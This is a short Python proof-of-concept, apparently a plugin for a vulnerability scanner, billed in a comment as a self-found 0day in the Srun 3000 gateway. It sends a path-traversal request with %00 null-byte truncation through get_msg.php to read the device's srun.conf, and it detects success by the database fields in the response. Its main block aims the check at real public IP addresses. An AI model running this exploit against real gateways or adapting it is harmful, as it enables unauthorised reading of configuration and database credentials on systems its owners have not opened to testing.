#!/usr/bin/env python
#-*- coding:utf-8 -*-
# info:自挖0day  需环境可%00截断

import urlparse
def assign(service, arg):
    if service == 'srun_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc = arg + 'get_msg.php?action=rad_client&msg_id=../srun3/etc/srun.conf%00'
    code, head, res, errcode, _ = curl.curl2(poc)
    if code ==200 and 'dbname' in res and 'is_checkout' in res:
        security_hole("Srun_3000 Gate vulnerable!:" + poc)

if __name__ == '__main__':
    from dummy import *
    audit(assign('srun_gateway', 'http://218.95.4.78/')[1])
    #audit(assign('srun_gateway', 'http://223.72.180.45/')[1])